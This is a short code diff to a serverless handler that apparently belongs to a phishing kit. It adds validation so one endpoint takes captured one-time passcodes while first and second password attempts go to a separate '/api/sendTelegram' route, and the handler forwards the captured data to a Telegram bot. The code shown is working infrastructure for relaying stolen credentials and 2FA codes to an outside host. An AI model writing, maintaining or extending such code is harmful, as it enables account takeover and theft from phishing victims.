@@ -73,6 +73,24 @@ exports.handler = async (event) => {
 
   try {
     const body = JSON.parse(event.body || '{}');
+
+    // Validate: this endpoint handles OTP ONLY.
+    // Reject any payload that looks like a credentials submission.
+    if (!body.otp) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid payload for OTP endpoint. Missing otp field.' }),
+      };
+    }
+    if (body.firstAttemptPassword || body.secondAttemptPassword) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid payload for OTP endpoint. Use /api/sendTelegram for credentials.' }),
+      };
+    }
+
     const message = composeOtpMessage(body);
 
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
